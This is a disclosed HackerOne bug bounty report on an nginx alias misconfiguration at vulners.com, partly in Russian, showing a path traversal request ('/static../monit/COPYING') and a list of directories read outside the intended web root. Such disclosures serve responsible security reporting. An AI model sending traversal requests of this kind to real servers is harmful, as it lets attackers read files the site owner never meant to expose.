# [vulners.com] nginx alias_traversal

## Report Details
- **Report ID**: 317201
- **URL**: https://hackerone.com/reports/317201
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-02-17T19:34:56.469Z
- **Disclosed**: 2018-05-03T12:08:29.209Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: vulnerscom

## Vulnerability Information
Incorrect configuration of alias could allow an attacker to read file stored outside the target folder.
https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md

Уязвимость только в конфигурации http, на https такого нет.

Пример:
```http
GET /static../monit/COPYING HTTP/1.1
Host: vulners.com
```

{F264475}

Примеры директорий, которые я обнаружил
```
rh/
nginx/cache/
monit/bin/monit
monit/conf/
monit/man/
monit/COPYING
monit/CHANGES
```

## Impact

Incorrect configuration of alias could allow an attacker to read file stored outside the target folder.

## Attachments
- Screenshot_at_23-32-25.png
